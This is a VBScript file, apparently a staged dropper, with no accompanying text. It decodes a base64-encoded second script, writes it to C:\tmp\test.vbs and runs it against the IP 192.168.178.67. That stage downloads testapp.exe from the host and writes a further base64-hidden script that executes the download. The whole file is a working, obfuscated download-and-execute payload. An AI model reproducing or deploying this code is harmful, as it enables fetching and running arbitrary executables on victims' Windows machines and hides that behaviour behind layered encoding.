Function Stream_BinaryToString(Binary)
  Const adTypeText = 2
  Const adTypeBinary = 1

  'Create Stream object
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")

  'Specify stream type - we want To save binary data.
  BinaryStream.Type = adTypeBinary

  'Open the stream And write binary data To the object
  BinaryStream.Open
  BinaryStream.Write Binary

  'Change stream type To text/string
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeText

  'Specify charset For the output text (unicode) data.
  BinaryStream.CharSet = "us-ascii"

  'Open the stream And get text/string data from the object
  Stream_BinaryToString = BinaryStream.ReadText
  Set BinaryStream = Nothing
End Function

basePath = "C:\tmp\"
Set objFSO = CreateObject("Scripting.FileSystemObject")

If objFSO.FolderExists(basePath) = False Then
	objFSO.CreateFolder basePath
End If

Set oXML = CreateObject("Msxml2.DOMDocument")
Set oNode = oXML.CreateElement("base64")
oNode.dataType = "bin.base64"
oNode.text = "RnVuY3Rpb24gU3RyZWFtX0JpbmFyeVRvU3RyaW5nKEJpbmFyeSkKICBDb25zdCBhZFR5cGVUZXh0ID0gMgogIENvbnN0IGFkVHlwZUJpbmFyeSA9IDEKCiAgJ0NyZWF0ZSBTdHJlYW0gb2JqZWN0CiAgRGltIEJpbmFyeVN0cmVhbSAnQXMgTmV3IFN0cmVhbQogIFNldCBCaW5hcnlTdHJlYW0gPSBDcmVhdG" _
+"VPYmplY3QoIkFET0RCLlN0cmVhbSIpCgogICdTcGVjaWZ5IHN0cmVhbSB0eXBlIC0gd2Ugd2FudCBUbyBzYXZlIGJpbmFyeSBkYXRhLgogIEJpbmFyeVN0cmVhbS5UeXBlID0gYWRUeXBlQmluYXJ5CgogICdPcGVuIHRoZSBzdHJlYW0gQW5kIHdyaXRlIGJpbmFyeSBkYXRhIFRvIHRoZSBvYmplY3QKICBC" _
+"aW5hcnlTdHJlYW0uT3BlbgogIEJpbmFyeVN0cmVhbS5Xcml0ZSBCaW5hcnkKCiAgJ0NoYW5nZSBzdHJlYW0gdHlwZSBUbyB0ZXh0L3N0cmluZwogIEJpbmFyeVN0cmVhbS5Qb3NpdGlvbiA9IDAKICBCaW5hcnlTdHJlYW0uVHlwZSA9IGFkVHlwZVRleHQKCiAgJ1NwZWNpZnkgY2hhcnNldCBGb3IgdGhlIG" _
+"91dHB1dCB0ZXh0ICh1bmljb2RlKSBkYXRhLgogIEJpbmFyeVN0cmVhbS5DaGFyU2V0ID0gInVzLWFzY2lpIgoKICAnT3BlbiB0aGUgc3RyZWFtIEFuZCBnZXQgdGV4dC9zdHJpbmcgZGF0YSBmcm9tIHRoZSBvYmplY3QKICBTdHJlYW1fQmluYXJ5VG9TdHJpbmcgPSBCaW5hcnlTdHJlYW0uUmVhZFRleHQK" _
+"ICBTZXQgQmluYXJ5U3RyZWFtID0gTm90aGluZwpFbmQgRnVuY3Rpb24KaXAgPSBXU2NyaXB0LkFyZ3VtZW50cygwKQpTZXQgb2JqSHR0cCA9IENyZWF0ZU9iamVjdCgiV2luSHR0cC5XaW5IdHRwUmVxdWVzdC41LjEiKQpiYXNlUGF0aCA9ICJDOlx0bXBcIgp1cmwgPSAiaHR0cDovLyIrIGlwICsiL3Rlc3" _
+"RhcHAuZXhlIgpvYmpIdHRwLk9wZW4gIkdFVCIsIHVybCwgRmFsc2UKb2JqSHR0cC5TZW5kCgpmaWxlUGF0aCA9IGJhc2VQYXRoICsgTWlkKHVybCwgSW5TdHJSZXYodXJsLCAiLyIpICsgMSkKClNldCBiU3RyZWFtID0gQ3JlYXRlT2JqZWN0KCJBZG9kYi5TdHJlYW0iKQoKV2l0aCBiU3RyZWFtCgkuVHlw" _
+"ZSA9IDEKCS5PcGVuCgkuV3JpdGUgb2JqSHR0cC5SZXNwb25zZUJvZHkKCS5TYXZlVG9GaWxlIGZpbGVQYXRoLCAyCkVuZCBXaXRoCgpTZXQgb1hNTCA9IENyZWF0ZU9iamVjdCgiTXN4bWwyLkRPTURvY3VtZW50IikKU2V0IG9Ob2RlID0gb1hNTC5DcmVhdGVFbGVtZW50KCJiYXNlNjQiKQpvTm9kZS5kYX" _
+"RhVHlwZSA9ICJiaW4uYmFzZTY0IgpvTm9kZS50ZXh0ID0gIlUyVjBJRmR6YUZOb1pXeHNJRDBnVjFOamNtbHdkQzVEY21WaGRHVlBZbXBsWTNRb0lsZFRZM0pwY0hRdVUyaGxiR3dpS1FwWGMyaFRhR1ZzYkM1U2RXNGdJa002WEhSdGNGeDBaWE4wWVhCd0xtVjRaU0k9IgoKRGltIEZTTwpTZXQgRlNPID0g" _
+"Q3JlYXRlT2JqZWN0KCJTY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdCIpCgpTZXQgT3V0UHV0RmlsZSA9IEZTTy5PcGVuVGV4dEZpbGUoYmFzZVBhdGggKyAidGVzdDEudmJzIiAsOCAsIFRydWUpCgpPdXRQdXRGaWxlLldyaXRlTGluZShTdHJlYW1fQmluYXJ5VG9TdHJpbmcob05vZGUubm9kZVR5cGVkVm" _
+"FsdWUpKQoKU2V0IEZTTz0gTm90aGluZwpTZXQgV3NoU2hlbGwgPSBXU2NyaXB0LkNyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpCldzaFNoZWxsLlJ1biAid3NjcmlwdCAiICsgYmFzZVBhdGgrICsgInRlc3QxLnZicyIKCg=="

Dim FSO
Set FSO = CreateObject("Scripting.FileSystemObject")

Set OutPutFile = FSO.OpenTextFile(basePath + "test.vbs" ,8 , True)

OutPutFile.WriteLine(Stream_BinaryToString(oNode.nodeTypedValue))

Set FSO= Nothing
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "wscript "+ basePath+ "test.vbs "+ "192.168.178.67"
